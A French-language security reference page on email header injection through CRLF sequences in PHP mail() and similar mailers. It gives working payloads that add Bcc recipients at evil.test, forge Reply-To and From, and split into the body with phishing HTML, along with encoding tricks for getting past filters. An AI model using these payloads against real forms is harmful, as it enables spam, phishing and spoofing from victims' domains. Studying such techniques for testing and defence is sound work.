---
title: "Injection d'en-tête : faire passer du CRLF dans les en-têtes d'email"
description: "Injecter du CRLF (%0d%0a) dans Subject, From ou To pour que l'entrée concaténée ajoute des destinataires Bcc/Cc supplémentaires, forge des en-têtes, ou scinde dans le corps du message, le sink classique des en-têtes additionnels de PHP mail()."
keywords:
  - injection d'en-tête d'email
  - injection CRLF
  - injection d'en-tête de mail
  - injection Bcc
  - PHP mail
  - en-têtes additionnels
---

# Injection d'en-tête

Les en-têtes d'email sont un bloc de lignes `Name: value` séparées par `CRLF` (`\r\n`, URL-encodé `%0d%0a`) et terminées par une ligne vide. Lorsqu'une application dépose une valeur fournie par l'utilisateur directement dans un en-tête, un `CRLF` dans cette valeur termine l'en-tête courant tôt et laisse l'attaquant écrire d'autres lignes d'en-tête, ou une ligne vide supplémentaire qui pousse tout ce qui la suit dans le corps. Un seul champ non assaini devient le contrôle de tout le bloc d'en-têtes.

## Le sink classique

Le `mail()` de PHP concatène son quatrième argument (en-têtes additionnels) verbatim :

```php
mail($to, $subject, $body, "From: " . $_POST['sender']);
```

Tout ce que l'utilisateur met dans `sender` après un `CRLF` devient de nouveaux en-têtes. La même faille existe partout où `Subject`, `From`, `To`, `Reply-To`, ou un en-tête personnalisé est construit à partir d'un champ de requête sans retirer les sauts de ligne, y compris les bibliothèques de mailer appelées avec des chaînes brutes.

## Injecter des destinataires supplémentaires

Le coup à plus forte valeur est d'ajouter un `Bcc:` pour qu'une copie silencieuse de chaque message aille à l'attaquant. Avec le champ sender comme point d'entrée, le payload brut est :

```
attacker@evil.test%0d%0aBcc:collector@evil.test
```

qui se résout sur le fil en :

```
From: attacker@evil.test
Bcc: collector@evil.test
```

Un `Cc:` fonctionne de la même façon et est visible pour le vrai destinataire, donc `Bcc:` est généralement préféré. Plusieurs destinataires peuvent être chaînés dans un seul champ :

```
x@evil.test%0d%0aBcc:a@evil.test,b@evil.test,c@evil.test
```

Cela transforme un formulaire de contact ou un mailer de reset de mot de passe en canal d'envoi de mail contrôlé par l'attaquant (non pas un relais ouvert, qui est un MTA relayant pour des tiers arbitraires ; ici l'application est détournée en tant qu'expéditeur) pour du spam ou du phishing depuis le propre domaine de la victime, héritant de sa réputation SPF et DKIM.

## Forger et écraser des en-têtes

Parce que les lignes injectées ne sont que d'autres en-têtes, l'attaquant peut poser n'importe lesquels. Injectez un `Reply-To:` pour que les réponses atterrissent sur une boîte de l'attaquant, ou réaffirmez `From:` pour usurper une adresse interne :

```
support@victim.test%0d%0aReply-To:attacker@evil.test
```

Les en-têtes dupliqués se résolvent de façons spécifiques au client et au MTA, ce que l'attaquant peut exploiter pour montrer une valeur à un filtre et une autre au lecteur.

## Scinder dans le corps

Deux `CRLF` consécutifs ferment le bloc d'en-têtes. Tout ce qui suit la ligne vide est du corps de message, donc l'attaquant peut écraser le corps prévu par l'application avec son propre contenu, y compris du HTML :

```
x@evil.test%0d%0aBcc:collector@evil.test%0d%0a%0d%0a<h1>Pay this invoice</h1>
```

C'est ainsi qu'un endpoint « contactez-nous » bénin est détourné pour livrer un email de phishing entièrement écrit par l'attaquant.

## Encodage sur le fil

L'injection doit arriver au sink sous forme de vrais octets de retour chariot et de saut de ligne.

- Dans les corps de requête et les query strings URL-encodés, utilisez `%0d%0a`.
- Certaines stacks agissent sur un `%0a` nu (LF seul) ou un `%0d` nu ; testez chacun lorsque la paire complète est retirée.
- En JSON, envoyez l'échappement `\r\n`.
- Là où le champ est pré-décodé, collez des sauts de ligne littéraux.

Les règles de folding comptent aussi : une ligne commençant par un espace ou une tabulation est une continuation de l'en-tête précédent, donc un espace de tête après votre `CRLF` peut fusionner votre ligne dans celle du dessus au lieu de démarrer un nouvel en-tête.

## Outils

- **swaks** : couteau suisse pour SMTP, scriptant des enveloppes de mail forgées.
- **Burp Repeater** : injecter des séquences CRLF dans les champs d'en-tête Subject, From et To.
- **curl** : envoyer des payloads CRLF forgés dans les champs de formulaire de mail.
- Test manuel avec Burp Repeater et des payloads forgés.

## Références

- [OWASP: Testing for IMAP SMTP Injection (WSTG)](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_IMAP_SMTP_Injection)
- [PayloadsAllTheThings: CRLF Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CRLF%20Injection)
